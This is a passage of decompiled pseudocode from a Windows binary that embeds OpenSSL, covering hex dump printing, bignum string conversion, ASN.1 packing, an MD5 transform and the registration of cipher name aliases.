      sub_4248C0(v23, "\n", 0x121u);
      v19 += a1(v23, strlen(v23), a2);
      v12 += v10;
      --v21;
    }
    while ( v21 );
    v6 = v20;
  }
  if ( v6 <= 0 )
    return v19;
  sub_4191B0((int)v23, 289, "%s%04x - <SPACES/NULS>\n", (int)v24);
  return a1(v23, strlen(v23), a2) + v19;
}
// 439AB0: using guessed type char var_88[132];

//----- (00439DC0) --------------------------------------------------------
int __cdecl sub_439DC0(int a1, int a2, int a3, signed int Size)
{
  return sub_439AB0((int (__cdecl *)(char *, unsigned int, int))sub_406770, a1, a2, a3, Size);
}

//----- (00439DF0) --------------------------------------------------------
int __cdecl sub_439DF0(int a1, int a2, int a3, int a4, int a5)
{
  int v5; // esi
  int v6; // edi

  v5 = 0;
  if ( a5 >= 1 )
  {
    v6 = 0;
    if ( a5 - 1 > 0 )
    {
      do
      {
        if ( v6 && !v5 )
          sub_419190(a1, "%*s", a2, byte_4F1291);
        sub_419190(a1, "%02X:", *(unsigned __int8 *)(v6 + a4));
        v5 = (v5 + 1) % a3;
        if ( !v5 )
          sub_419190(a1, "\n");
        ++v6;
      }
      while ( v6 < a5 - 1 );
      if ( v6 && !v5 )
        sub_419190(a1, "%*s", a2, byte_4F1291);
    }
    sub_419190(a1, "%02X", *(unsigned __int8 *)(a4 + a5 - 1));
  }
  return 1;
}

//----- (00439EC0) --------------------------------------------------------
int __cdecl sub_439EC0(int a1, int a2, int a3)
{
  return sub_439AB0((int (__cdecl *)(char *, unsigned int, int))sub_406770, a1, a2, a3, 0);
}

//----- (00439EE0) --------------------------------------------------------
void **__cdecl sub_439EE0(int a1)
{
  void **v2; // eax
  void **v3; // esi
  signed int v4; // eax
  void *v5; // eax
  const char *v6; // eax
  void *v7; // eax
  void *v8; // eax

  if ( !a1 )
    return 0;
  if ( (*(_BYTE *)(a1 + 20) & 1) == 0 )
    return (void **)a1;
  v2 = (void **)sub_422B30();
  v3 = v2;
  if ( v2 )
  {
    v2[5] = (void *)(*(_DWORD *)(a1 + 20) | 0xD);
    v4 = *(_DWORD *)(a1 + 12);
    if ( v4 > 0 )
    {
      v5 = sub_424800(*(void **)(a1 + 16), v4);
      v3[4] = v5;
      if ( !v5 )
        goto LABEL_13;
    }
    if ( ((v3[3] = *(void **)(a1 + 12), v3[2] = *(void **)(a1 + 8), (v6 = *(const char **)(a1 + 4)) == 0)
       || (v7 = sub_4247B0(v6), (v3[1] = v7) != 0))
      && (!*(_DWORD *)a1 || (v8 = sub_4247B0(*(const char **)a1), (*v3 = v8) != 0)) )
    {
      return v3;
    }
    else
    {
LABEL_13:
      sub_422B70(v3);
      sub_408310(8, 101, 65, (int)"crypto\\objects\\obj_lib.c", 54);
      return 0;
    }
  }
  else
  {
    sub_408310(8, 101, 13, (int)"crypto\\objects\\obj_lib.c", 29);
    return 0;
  }
}

//----- (00439FC0) --------------------------------------------------------
int __cdecl sub_439FC0(int a1, int a2)
{
  unsigned int v2; // ecx
  int result; // eax
  unsigned __int8 *v4; // edx
  unsigned __int8 *v5; // esi
  int v6; // eax

  v2 = *(_DWORD *)(a1 + 12);
  result = v2 - *(_DWORD *)(a2 + 12);
  if ( !result )
  {
    v4 = *(unsigned __int8 **)(a2 + 16);
    v5 = *(unsigned __int8 **)(a1 + 16);
    if ( v2 < 4 )
    {
LABEL_5:
      if ( !v2 )
        return 0;
    }
    else
    {
      while ( *(_DWORD *)v5 == *(_DWORD *)v4 )
      {
        v2 -= 4;
        v4 += 4;
        v5 += 4;
        if ( v2 < 4 )
          goto LABEL_5;
      }
    }
    v6 = *v5 - *v4;
    if ( v6 )
      return (v6 >> 31) | 1;
    if ( v2 > 1 )
    {
      v6 = v5[1] - v4[1];
      if ( v6 )
        return (v6 >> 31) | 1;
      if ( v2 > 2 )
      {
        v6 = v5[2] - v4[2];
        if ( !v6 )
        {
          if ( v2 > 3 )
          {
            v6 = v5[3] - v4[3];
            return (v6 >> 31) | 1;
          }
          return 0;
        }
        return (v6 >> 31) | 1;
      }
    }
    return 0;
  }
  return result;
}

//----- (0043A050) --------------------------------------------------------
_BYTE *__cdecl sub_43A050(_DWORD *a1)
{
  int v1; // eax
  int v2; // edi
  unsigned int v3; // eax
  int v4; // ebp
  _DWORD *v5; // edi
  _BYTE *v6; // ebx
  void **v7; // eax
  _BYTE *v8; // esi
  int v9; // eax
  int v10; // ecx
  _DWORD *v11; // edi
  int v12; // ecx
  void **Block; // [esp+10h] [ebp-14h]
  _DWORD *v15; // [esp+14h] [ebp-10h]
  int v16; // [esp+18h] [ebp-Ch]
  int v17; // [esp+1Ch] [ebp-8h]
  int v18; // [esp+20h] [ebp-4h]

  v17 = 0;
  Block = 0;
  v1 = sub_416F90(a1);
  v2 = 3 * v1 / 1000;
  v3 = (int)((unsigned __int64)(5153960757i64 * v1) >> 32) >> 2;
  v4 = (v3 >> 31) + v3 + v2 + 2;
  v18 = v4 / 9 + 1;
  v5 = sub_4133F0(4 * v18);
  v15 = v5;
  v6 = sub_4133F0(v4 + 3);
  if ( v6 && v5 )
  {
    v7 = sub_4176D0((int)a1);
    Block = v7;
    if ( !v7 )
      goto LABEL_21;
    v8 = v6;
    if ( sub_416DB0((int)v7) )
    {
      *v6 = 48;
      v6[1] = 0;
    }
    else
    {
      if ( sub_416E40((int)Block) )
      {
        *v6 = 45;
        v8 = v6 + 1;
      }
      if ( !sub_416DB0((int)Block) )
      {
        v16 = 0;
        while ( v16 >> 2 < v18 )
        {
          v9 = sub_437F10(Block, 0x3B9ACA00u);
          *v5 = v9;
          if ( v9 == -1 )
            break;
          v16 += 4;
          ++v5;
          if ( sub_416DB0((int)Block) )
            goto LABEL_13;
        }
        goto LABEL_20;
      }
LABEL_13:
      v10 = *(v5 - 1);
      v11 = v5 - 1;
      sub_4191B0((int)v8, (int)&v6[v4 - (_DWORD)v8 + 3], "%u", v10);
      for ( ; *v8; ++v8 )
        ;
      while ( v11 != v15 )
      {
        v12 = *--v11;
        sub_4191B0((int)v8, (int)&v6[v4 - (_DWORD)v8 + 3], "%09u", v12);
        for ( ; *v8; ++v8 )
          ;
      }
    }
    v17 = 1;
LABEL_20:
    v5 = v15;
    goto LABEL_21;
  }
  sub_408310(3, 104, 65, (int)"crypto\\bn\\bn_print.c", 79);
LABEL_21:
  sub_413490(v5);
  sub_417060(Block);
  if ( v17 )
    return v6;
  sub_413490(v6);
  return 0;
}

//----- (0043A270) --------------------------------------------------------
int __cdecl sub_43A270(void ***a1, _BYTE *a2)
{
  _BYTE *v2; // edi
  int i; // esi
  void ***v4; // edi
  int v5; // ebx
  int v7; // eax
  int v9; // ebp
  int v10; // ebx
  int v11; // edi
  char *v12; // esi
  int v13; // eax
  void **Block; // [esp+8h] [ebp-10h]
  char *v15; // [esp+Ch] [ebp-Ch]
  int v16; // [esp+10h] [ebp-8h]
  int v17; // [esp+14h] [ebp-4h]

  v2 = a2;
  Block = 0;
  v16 = 0;
  if ( !a2 || !*a2 )
    return 0;
  if ( *a2 == 45 )
  {
    v2 = a2 + 1;
    v16 = 1;
    ++a2;
  }
  for ( i = 0; i <= 0x1FFFFFFF; ++i )
  {
    if ( !isxdigit((unsigned __int8)v2[i]) )
      break;
  }
  if ( i && i <= 0x1FFFFFFF )
  {
    v4 = a1;
    v5 = i + v16;
    v17 = i + v16;
    if ( !a1 )
      return v5;
    if ( *a1 )
    {
      Block = *a1;
      sub_417490(*a1, 0);
    }
    else
    {
      Block = (void **)sub_4168C0();
      if ( !Block )
        return 0;
    }
    if ( 4 * i <= 2147483616 )
    {
      v7 = (4 * i + 31) / 32;
      if ( v7 > (int)Block[2] ? sub_4171F0((int)Block, v7) : Block )
      {
        v9 = i;
        v15 = 0;
        if ( i > 0 )
        {
          do
          {
            v10 = 8;
            if ( v9 < 8 )
              v10 = v9;
            v11 = 0;
            v12 = &a2[v9 - v10];
            do
            {
              v13 = sub_424920(*v12);
              if ( v13 < 0 )
                v13 = 0;
              --v10;
              v11 = v13 | (16 * v11);
              ++v12;
            }
            while ( v10 > 0 );
            *((_DWORD *)*Block + (_DWORD)v15) = v11;
            v9 -= 8;
            ++v15;
          }
          while ( v9 > 0 );
          v4 = a1;
          v5 = v17;
        }
        Block[1] = v15;
        sub_416F60(Block);
        Block[3] = (void *)v16;
        *v4 = Block;
        return v5;
      }
    }
  }
  else
  {
    v4 = a1;
  }
  if ( *v4 )
    return 0;
  sub_417060(Block);
  return 0;
}

//----- (0043A420) --------------------------------------------------------
int __cdecl sub_43A420(void ***a1, char *a2)
{
  char *v2; // ebx
  void **v3; // edi
  int i; // esi
  int result; // eax
  int v6; // eax
  _DWORD *v7; // eax
  int v8; // eax
  char v9; // cl
  int j; // esi
  int v11; // [esp+8h] [ebp-4h]
  int v12; // [esp+14h] [ebp+8h]

  v2 = a2;
  v3 = 0;
  v11 = 0;
  if ( !a2 || !*a2 )
    return 0;
  if ( *a2 == 45 )
  {
    v11 = 1;
    v2 = a2 + 1;
  }
  for ( i = 0; i <= 0x1FFFFFFF; ++i )
  {
    if ( !isdigit((unsigned __int8)v2[i]) )
      break;
  }
  if ( !i || i > 0x1FFFFFFF )
    goto LABEL_30;
  result = i + v11;
  v12 = i + v11;
  if ( !a1 )
    return result;
  v3 = *a1;
  if ( *a1 )
  {
    sub_417490(v3, 0);
  }
  else
  {
    v3 = (void **)sub_4168C0();
    if ( !v3 )
      return 0;
  }
  if ( 4 * i > 2147483616
    || ((v6 = (4 * i + 31) / 32, v6 > (int)v3[2]) ? (v7 = sub_4171F0((int)v3, v6)) : (v7 = v3), !v7) )
  {
LABEL_30:
    if ( !*a1 )
    {
      sub_417060(v3);
      return 0;
    }
    return 0;
  }
  v8 = 9 * (i / 9 + 1) - i;
  if ( v8 == 9 )
    v8 = 0;
  v9 = *v2;
  for ( j = 0; *v2; v9 = *v2 )
  {
    ++v8;
    ++v2;
    j = v9 + 10 * j - 48;
    if ( v8 == 9 )
    {
      if ( !sub_438150((unsigned int **)v3, 0x3B9ACA00u) || !sub_437FD0((int *)v3, j) )
        goto LABEL_30;
      j = 0;
      v8 = 0;
    }
  }
  v3[3] = (void *)v11;
  sub_416F60(v3);
  result = v12;
  *a1 = v3;
  return result;
}

//----- (0043A5A0) --------------------------------------------------------
int __cdecl sub_43A5A0(void ***a1, char *a2)
{
  char *v2; // eax
  char v3; // cl
  void ***v4; // edi
  int result; // eax

  v2 = a2;
  if ( *a2 == 45 )
    v2 = a2 + 1;
  if ( *v2 == 48 && ((v3 = v2[1], v3 == 88) || v3 == 120) )
  {
    v4 = a1;
    result = sub_43A270(a1, v2 + 2);
    if ( !result )
      return result;
  }
  else
  {
    v4 = a1;
    result = sub_43A420(a1, v2);
    if ( !result )
      return result;
  }
  result = 1;
  if ( *a2 == 45 )
    (*v4)[3] = (void *)1;
  return result;
}

//----- (0043A610) --------------------------------------------------------
int __cdecl sub_43A610(int a1, _DWORD *a2)
{
  int v2; // edi
  int v3; // ebx
  int i; // esi
  int v5; // eax

  v2 = 0;
  if ( a2[3] && sub_405110(a1, (int)"-", 1) != 1 || sub_416DB0((int)a2) && sub_405110(a1, (int)"0", 1) != 1 )
    return 0;
  v3 = a2[1] - 1;
  if ( v3 >= 0 )
  {
    while ( 2 )
    {
      for ( i = 28; i >= 0; i -= 4 )
      {
        v5 = (*(_DWORD *)(*a2 + 4 * v3) >> i) & 0xF;
        if ( v2 || v5 )
        {
          if ( sub_405110(a1, (int)&a0123456789abcd_1[v5], 1) != 1 )
            return 0;
          v2 = 1;
        }
      }
      if ( --v3 >= 0 )
        continue;
      break;
    }
  }
  return 1;
}

//----- (0043A6D0) --------------------------------------------------------
void **__cdecl sub_43A6D0(int a1, int a2, void ***a3)
{
  void **v3; // edi
  signed int v5; // eax

  if ( !a3 || (v3 = *a3) == 0 )
  {
    v3 = (void **)sub_432DC0();
    if ( !v3 )
    {
      sub_408310(13, 198, 65, (int)"crypto\\asn1\\asn_pack.c", 22);
      return 0;
    }
  }
  sub_413490(v3[2]);
  v3[2] = 0;
  v5 = sub_42F620(a1, v3 + 2, a2);
  *v3 = (void *)v5;
  if ( !v5 )
  {
    sub_408310(13, 198, 112, (int)"crypto\\asn1\\asn_pack.c", 33);
    goto LABEL_9;
  }
  if ( !v3[2] )
  {
    sub_408310(13, 198, 65, (int)"crypto\\asn1\\asn_pack.c", 37);
LABEL_9:
    if ( !a3 || !*a3 )
      sub_432A30(v3);
    return 0;
  }
  if ( a3 && !*a3 )
    *a3 = v3;
  return v3;
}

//----- (0043A800) --------------------------------------------------------
int __cdecl sub_43A800(int *a1, _DWORD *a2, int a3)
{
  _DWORD *v3; // esi
  int v4; // eax
  int v5; // ebx
  int v6; // ecx
  int v7; // edx
  int v8; // eax
  int v9; // edx
  int v10; // ecx
  int v11; // ebx
  int v12; // eax
  int v13; // edx
  int v14; // ecx
  int v15; // ebx
  int v16; // eax
  int v17; // edx
  int v18; // ecx
  int v19; // ebx
  int v20; // eax
  int v21; // edx
  int v22; // ecx
  int v23; // ebx
  int v24; // eax
  int v25; // edx
  int v26; // ecx
  int v27; // ebx
  int v28; // eax
  int v29; // edx
  int v30; // ecx
  int v31; // ebx
  int v32; // eax
  int v33; // edx
  int v34; // ecx
  int v35; // ebx
  int v36; // eax
  int v37; // edx
  int v38; // ecx
  int v39; // ebx
  int v40; // eax
  int v41; // edx
  int v42; // ecx
  int v43; // ebx
  int v44; // eax
  int v45; // edx
  int v46; // ecx
  int v47; // ebx
  int v48; // eax
  int v49; // edx
  int v50; // ecx
  int v51; // ebx
  int v52; // eax
  int v53; // edx
  int v54; // ecx
  int v55; // ebx
  int v56; // eax
  int v57; // edx
  int v58; // ecx
  int v59; // ebx
  int v60; // eax
  int v61; // edx
  int v62; // ecx
  int v63; // ebx
  int v64; // eax
  int v65; // edx
  int v66; // ecx
  int v67; // ebx
  int v68; // eax
  int v69; // edx
  int v70; // ecx
  int v71; // ebx

  v3 = a2;
  v4 = *a1;
  v5 = a1[1];
  v6 = a1[2];
  v7 = a1[3];
  do
  {
    v8 = v5 + __ROL4__((v7 ^ v5 & (v7 ^ v6)) + v4 + *v3 - 680876936, 7);
    v9 = v8 + __ROL4__((v6 ^ v8 & (v6 ^ v5)) + v7 + v3[1] - 389564586, 12);
    v10 = v9 + __ROL4__((v5 ^ v9 & (v5 ^ v8)) + v6 + v3[2] + 606105819, 17);
    v11 = v10 + __ROL4__((v8 ^ v10 & (v8 ^ v9)) + v5 + v3[3] - 1044525330, 22);
    v12 = v11 + __ROL4__((v9 ^ v11 & (v9 ^ v10)) + v8 + v3[4] - 176418897, 7);
    v13 = v12 + __ROL4__((v10 ^ v12 & (v10 ^ v11)) + v9 + v3[5] + 1200080426, 12);
    v14 = v13 + __ROL4__((v11 ^ v13 & (v11 ^ v12)) + v10 + v3[6] - 1473231341, 17);
    v15 = v14 + __ROL4__((v12 ^ v14 & (v12 ^ v13)) + v11 + v3[7] - 45705983, 22);
    v16 = v15 + __ROL4__((v13 ^ v15 & (v13 ^ v14)) + v12 + v3[8] + 1770035416, 7);
    v17 = v16 + __ROL4__((v14 ^ v16 & (v14 ^ v15)) + v13 + v3[9] - 1958414417, 12);
    v18 = v17 + __ROL4__((v15 ^ v17 & (v15 ^ v16)) + v14 + v3[10] - 42063, 17);
    v19 = v18 + __ROL4__((v16 ^ v18 & (v16 ^ v17)) + v15 + v3[11] - 1990404162, 22);
    v20 = v19 + __ROL4__((v17 ^ v19 & (v17 ^ v18)) + v16 + v3[12] + 1804603682, 7);
    v21 = v20 + __ROL4__((v18 ^ v20 & (v18 ^ v19)) + v17 + v3[13] - 40341101, 12);
    v22 = v21 + __ROL4__((v19 ^ v21 & (v19 ^ v20)) + v18 + v3[14] - 1502002290, 17);
    v23 = v22 + __ROL4__((v20 ^ v22 & (v20 ^ v21)) + v19 + v3[15] + 1236535329, 22);
    v24 = v23 + __ROL4__((v22 ^ v21 & (v23 ^ v22)) + v20 + v3[1] - 165796510, 5);
    v25 = v24 + __ROL4__((v23 ^ v22 & (v24 ^ v23)) + v21 + v3[6] - 1069501632, 9);
    v26 = v25 + __ROL4__((v24 ^ v23 & (v25 ^ v24)) + v22 + v3[11] + 643717713, 14);
    v27 = v26 + __ROL4__((v25 ^ v24 & (v26 ^ v25)) + v23 + *v3 - 373897302, 20);
    v28 = v27 + __ROL4__((v26 ^ v25 & (v27 ^ v26)) + v24 + v3[5] - 701558691, 5);
    v29 = v28 + __ROL4__((v27 ^ v26 & (v28 ^ v27)) + v25 + v3[10] + 38016083, 9);
    v30 = v29 + __ROL4__((v28 ^ v27 & (v29 ^ v28)) + v26 + v3[15] - 660478335, 14);
    v31 = v30 + __ROL4__((v29 ^ v28 & (v30 ^ v29)) + v27 + v3[4] - 405537848, 20);
    v32 = v31 + __ROL4__((v30 ^ v29 & (v31 ^ v30)) + v28 + v3[9] + 568446438, 5);
    v33 = v32 + __ROL4__((v31 ^ v30 & (v32 ^ v31)) + v29 + v3[14] - 1019803690, 9);
    v34 = v33 + __ROL4__((v32 ^ v31 & (v33 ^ v32)) + v30 + v3[3] - 187363961, 14);
    v35 = v34 + __ROL4__((v33 ^ v32 & (v34 ^ v33)) + v31 + v3[8] + 1163531501, 20);
    v36 = v35 + __ROL4__((v34 ^ v33 & (v35 ^ v34)) + v32 + v3[13] - 1444681467, 5);
    v37 = v36 + __ROL4__((v35 ^ v34 & (v36 ^ v35)) + v33 + v3[2] - 51403784, 9);
    v38 = v37 + __ROL4__((v36 ^ v35 & (v37 ^ v36)) + v34 + v3[7] + 1735328473, 14);
    v39 = v38 + __ROL4__((v37 ^ v36 & (v38 ^ v37)) + v35 + v3[12] - 1926607734, 20);
    v40 = v39 + __ROL4__((v39 ^ v37 ^ v38) + v36 + v3[5] - 378558, 4);
    v41 = v40 + __ROL4__((v40 ^ v38 ^ v39) + v37 + v3[8] - 2022574463, 11);
    v42 = v41 + __ROL4__((v41 ^ v39 ^ v40) + v38 + v3[11] + 1839030562, 16);
    v43 = v42 + __ROL4__((v42 ^ v40 ^ v41) + v39 + v3[14] - 35309556, 23);
    v44 = v43 + __ROL4__((v43 ^ v41 ^ v42) + v40 + v3[1] - 1530992060, 4);
    v45 = v44 + __ROL4__((v44 ^ v42 ^ v43) + v41 + v3[4] + 1272893353, 11);
    v46 = v45 + __ROL4__((v45 ^ v43 ^ v44) + v42 + v3[7] - 155497632, 16);
    v47 = v46 + __ROL4__((v46 ^ v44 ^ v45) + v43 + v3[10] - 1094730640, 23);
    v48 = v47 + __ROL4__((v47 ^ v45 ^ v46) + v44 + v3[13] + 681279174, 4);
    v49 = v48 + __ROL4__((v48 ^ v46 ^ v47) + v45 + *v3 - 358537222, 11);
    v50 = v49 + __ROL4__((v49 ^ v47 ^ v48) + v46 + v3[3] - 722521979, 16);
    v51 = v50 + __ROL4__((v50 ^ v48 ^ v49) + v47 + v3[6] + 76029189, 23);
    v52 = v51 + __ROL4__((v51 ^ v49 ^ v50) + v48 + v3[9] - 640364487, 4);
    v53 = v52 + __ROL4__((v52 ^ v50 ^ v51) + v49 + v3[12] - 421815835, 11);
    v54 = v53 + __ROL4__((v53 ^ v51 ^ v52) + v50 + v3[15] + 530742520, 16);
    v55 = v54 + __ROL4__((v54 ^ v52 ^ v53) + v51 + v3[2] - 995338651, 23);
    v56 = v55 + __ROL4__((v54 ^ (v55 | ~v53)) + v52 + *v3 - 198630844, 6);
    v57 = v56 + __ROL4__((v55 ^ (v56 | ~v54)) + v53 + v3[7] + 1126891415, 10);
    v58 = v57 + __ROL4__((v56 ^ (v57 | ~v55)) + v54 + v3[14] - 1416354905, 15);
    v59 = v58 + __ROL4__((v57 ^ (v58 | ~v56)) + v55 + v3[5] - 57434055, 21);
    v60 = v59 + __ROL4__((v58 ^ (v59 | ~v57)) + v56 + v3[12] + 1700485571, 6);
    v61 = v60 + __ROL4__((v59 ^ (v60 | ~v58)) + v57 + v3[3] - 1894986606, 10);
    v62 = v61 + __ROL4__((v60 ^ (v61 | ~v59)) + v58 + v3[10] - 1051523, 15);
    v63 = v62 + __ROL4__((v61 ^ (v62 | ~v60)) + v59 + v3[1] - 2054922799, 21);
    v64 = v63 + __ROL4__((v62 ^ (v63 | ~v61)) + v60 + v3[8] + 1873313359, 6);
    v65 = v64 + __ROL4__((v63 ^ (v64 | ~v62)) + v61 + v3[15] - 30611744, 10);
    v66 = v65 + __ROL4__((v64 ^ (v65 | ~v63)) + v62 + v3[6] - 1560198380, 15);
    v67 = v66 + __ROL4__((v65 ^ (v66 | ~v64)) + v63 + v3[13] + 1309151649, 21);
    v68 = v67 + __ROL4__((v66 ^ (v67 | ~v65)) + v64 + v3[4] - 145523070, 6);
    v69 = v68 + __ROL4__((v67 ^ (v68 | ~v66)) + v65 + v3[11] - 1120210379, 10);
    v70 = v69 + __ROL4__((v68 ^ (v69 | ~v67)) + v66 + v3[2] + 718787259, 15);
    v71 = (v69 ^ (v70 | ~v68)) + v67 + v3[9] - 343485551;
    v3 += 16;
    v4 = *a1 + v68;
    v5 = a1[1] + v70 + __ROL4__(v71, 21);
    v6 = a1[2] + v70;
    v7 = a1[3] + v69;
    *a1 = v4;
    a1[1] = v5;
    a1[2] = v6;
    a1[3] = v7;
  }
  while ( &a2[16 * a3 - 16] >= v3 );
  return (int)&a2[16 * a3 - 16];
}

//----- (0043AEB0) --------------------------------------------------------
BOOL sub_43AEB0()
{
  return sub_407C70()
      && sub_45C940()
      && sub_45C900()
      && sub_45C8C0()
      && sub_45C880()
      && sub_45C840()
      && sub_45C800()
      && sub_45C7C0()
      && sub_45C780()
      && sub_45C740()
      && sub_45C700()
      && sub_45C6C0()
      && sub_45C680()
      && sub_45C640()
      && sub_45C600()
      && sub_45C5C0()
      && sub_45C580()
      && sub_45C540()
      && sub_45C500()
      && sub_45C4C0()
      && sub_45C480()
      && sub_45C440()
      && sub_45C400()
      && sub_45C3C0()
      && sub_45C380()
      && sub_45C340()
      && sub_45C300()
      && sub_45C2C0()
      && sub_45C280();
}

//----- (0043B000) --------------------------------------------------------
int sub_43B000()
{
  unsigned int *v0; // eax
  unsigned int *v1; // eax
  unsigned int *v2; // eax
  unsigned int *v3; // eax
  unsigned int *v4; // eax
  unsigned int *v5; // eax
  unsigned int *v6; // eax
  unsigned int *v7; // eax
  unsigned int *v8; // eax
  unsigned int *v9; // eax
  unsigned int *v10; // eax
  unsigned int *v11; // eax
  unsigned int *v12; // eax
  unsigned int *v13; // eax
  unsigned int *v14; // eax
  unsigned int *v15; // eax
  unsigned int *v16; // eax
  unsigned int *v17; // eax
  unsigned int *v18; // eax
  unsigned int *v19; // eax
  unsigned int *v20; // eax
  unsigned int *v21; // eax
  unsigned int *v22; // eax
  unsigned int *v23; // eax
  unsigned int *v24; // eax
  unsigned int *v25; // eax
  unsigned int *v26; // eax
  unsigned int *v27; // eax
  unsigned int *v28; // eax
  unsigned int *v29; // eax
  unsigned int *v30; // eax
  unsigned int *v31; // eax
  unsigned int *v32; // eax
  unsigned int *v33; // eax
  unsigned int *v34; // eax
  unsigned int *v35; // eax
  unsigned int *v36; // eax
  unsigned int *v37; // eax
  unsigned int *v38; // eax
  unsigned int *v39; // eax
  unsigned int *v40; // eax
  unsigned int *v41; // eax
  unsigned int *v42; // eax
  unsigned int *v43; // eax
  unsigned int *v44; // eax
  unsigned int *v45; // eax
  unsigned int *v46; // eax
  unsigned int *v47; // eax
  unsigned int *v48; // eax
  unsigned int *v49; // eax
  unsigned int *v50; // eax
  unsigned int *v51; // eax
  unsigned int *v52; // eax
  unsigned int *v53; // eax
  unsigned int *v54; // eax
  unsigned int *v55; // eax
  unsigned int *v56; // eax
  unsigned int *v57; // eax
  unsigned int *v58; // eax
  unsigned int *v59; // eax
  unsigned int *v60; // eax
  unsigned int *v61; // eax
  unsigned int *v62; // eax
  unsigned int *v63; // eax
  unsigned int *v64; // eax
  unsigned int *v65; // eax
  unsigned int *v66; // eax
  unsigned int *v67; // eax
  unsigned int *v68; // eax
  unsigned int *v69; // eax
  unsigned int *v70; // eax
  unsigned int *v71; // eax
  unsigned int *v72; // eax
  unsigned int *v73; // eax
  unsigned int *v74; // eax
  unsigned int *v75; // eax
  unsigned int *v76; // eax
  unsigned int *v77; // eax
  unsigned int *v78; // eax
  unsigned int *v79; // eax
  unsigned int *v80; // eax
  unsigned int *v81; // eax
  unsigned int *v82; // eax
  unsigned int *v83; // eax
  unsigned int *v84; // eax
  unsigned int *v85; // eax
  unsigned int *v86; // eax
  unsigned int *v87; // eax
  unsigned int *v88; // eax
  unsigned int *v89; // eax
  unsigned int *v90; // eax
  unsigned int *v91; // eax
  unsigned int *v92; // eax
  unsigned int *v93; // eax
  unsigned int *v94; // eax
  unsigned int *v95; // eax
  unsigned int *v96; // eax
  unsigned int *v97; // eax
  unsigned int *v98; // eax
  unsigned int *v99; // eax
  unsigned int *v100; // eax
  unsigned int *v101; // eax
  unsigned int *v102; // eax
  unsigned int *v103; // eax
  unsigned int *v104; // eax
  unsigned int *v105; // eax
  unsigned int *v106; // eax
  unsigned int *v107; // eax

  v0 = (unsigned int *)sub_45FFB0();
  sub_430C70(v0);
  v1 = (unsigned int *)sub_45FFE0();
  sub_430C70(v1);
  v2 = (unsigned int *)sub_45FFF0();
  sub_430C70(v2);
  v3 = (unsigned int *)sub_45F610();
  sub_430C70(v3);
  v4 = (unsigned int *)sub_45F640();
  sub_430C70(v4);
  v5 = (unsigned int *)sub_45F660();
  sub_430C70(v5);
  v6 = (unsigned int *)sub_45F670();
  sub_430C70(v6);
  v7 = (unsigned int *)sub_45FFC0();
  sub_430C70(v7);
  v8 = (unsigned int *)sub_45F620();
  sub_430C70(v8);
  v9 = (unsigned int *)sub_45F650();
  sub_430C70(v9);
  v10 = (unsigned int *)sub_460070();
  sub_430C70(v10);
  sub_44B920((int)"DESX", 32770, (int)"DESX-CBC");
  sub_44B920((int)"desx", 32770, (int)"DESX-CBC");
  v11 = (unsigned int *)sub_45FFA0();
  sub_430C70(v11);
  sub_44B920((int)"DES", 32770, (int)"DES-CBC");
  sub_44B920((int)"des", 32770, (int)"DES-CBC");
  v12 = (unsigned int *)sub_45F600();
  sub_430C70(v12);
  v13 = (unsigned int *)sub_45F630();
  sub_430C70(v13);
  sub_44B920((int)"DES3", 32770, (int)"DES-EDE3-CBC");
  sub_44B920((int)"des3", 32770, (int)"DES-EDE3-CBC");
  v14 = (unsigned int *)sub_45FFD0();
  sub_430C70(v14);
  v15 = (unsigned int *)sub_45F790();
  sub_430C70(v15);
  sub_44B920((int)"DES-EDE-ECB", 32770, (int)"DES-EDE");
  sub_44B920((int)"des-ede-ecb", 32770, (int)"DES-EDE");
  v16 = (unsigned int *)sub_45F7A0();
  sub_430C70(v16);
  sub_44B920((int)"DES-EDE3-ECB", 32770, (int)"DES-EDE3");
  sub_44B920((int)"des-ede3-ecb", 32770, (int)"DES-EDE3");
  v17 = (unsigned int *)sub_45FA90();
  sub_430C70(v17);
  sub_44B920((int)"des3-wrap", 32770, (int)"id-smime-alg-CMS3DESwrap");
  v18 = (unsigned int *)sub_45EFD0();
  sub_430C70(v18);
  v19 = (unsigned int *)sub_45EFE0();
  sub_430C70(v19);
  v20 = (unsigned int *)sub_45EFC0();
  sub_430C70(v20);
  v21 = (unsigned int *)sub_45EB30();
  sub_430C70(v21);
  v22 = (unsigned int *)sub_45EB10();
  sub_430C70(v22);
  v23 = (unsigned int *)sub_45EB20();
  sub_430C70(v23);
  v24 = (unsigned int *)sub_45EB00();
  sub_430C70(v24);
  sub_44B920((int)"IDEA", 32770, (int)"IDEA-CBC");
  sub_44B920((int)"idea", 32770, (int)"IDEA-CBC");
  v25 = (unsigned int *)sub_45E850();
  sub_430C70(v25);
  v26 = (unsigned int *)sub_45E830();
  sub_430C70(v26);
  v27 = (unsigned int *)sub_45E840();
  sub_430C70(v27);
  v28 = (unsigned int *)sub_45E820();
  sub_430C70(v28);
  sub_44B920((int)"SEED", 32770, (int)"SEED-CBC");
  sub_44B920((int)"seed", 32770, (int)"SEED-CBC");
  v29 = (unsigned int *)sub_45E2E0();
  sub_430C70(v29);
  v30 = (unsigned int *)sub_45E2C0();
  sub_430C70(v30);
  v31 = (unsigned int *)sub_45E2D0();
  sub_430C70(v31);
  v32 = (unsigned int *)sub_45E2B0();
  sub_430C70(v32);
  v33 = (unsigned int *)sub_45E300();
  sub_430C70(v33);
  v34 = (unsigned int *)sub_45E2F0();
  sub_430C70(v34);
  sub_44B920((int)"RC2", 32770, (int)"RC2-CBC");
  sub_44B920((int)"rc2", 32770, (int)"RC2-CBC");
  sub_44B920((int)"rc2-128", 32770, (int)"RC2-CBC");
  sub_44B920((int)"rc2-64", 32770, (int)"RC2-64-CBC");
  sub_44B920((int)"rc2-40", 32770, (int)"RC2-40-CBC");
  v35 = (unsigned int *)sub_45DFD0();
  sub_430C70(v35);
  v36 = (unsigned int *)sub_45DFB0();
  sub_430C70(v36);
  v37 = (unsigned int *)sub_45DFC0();
  sub_430C70(v37);
  v38 = (unsigned int *)sub_45DFA0();
  sub_430C70(v38);
  sub_44B920((int)"BF", 32770, (int)"BF-CBC");
  sub_44B920((int)"bf", 32770, (int)"BF-CBC");
  sub_44B920((int)"blowfish", 32770, (int)"BF-CBC");
  v39 = (unsigned int *)sub_45DCD0();
  sub_430C70(v39);
  v40 = (unsigned int *)sub_45DCB0();
  sub_430C70(v40);
  v41 = (unsigned int *)sub_45DCC0();
  sub_430C70(v41);
  v42 = (unsigned int *)sub_45DCA0();
  sub_430C70(v42);
  sub_44B920((int)"CAST", 32770, (int)"CAST5-CBC");
  sub_44B920((int)"cast", 32770, (int)"CAST5-CBC");
  sub_44B920((int)"CAST-cbc", 32770, (int)"CAST5-CBC");
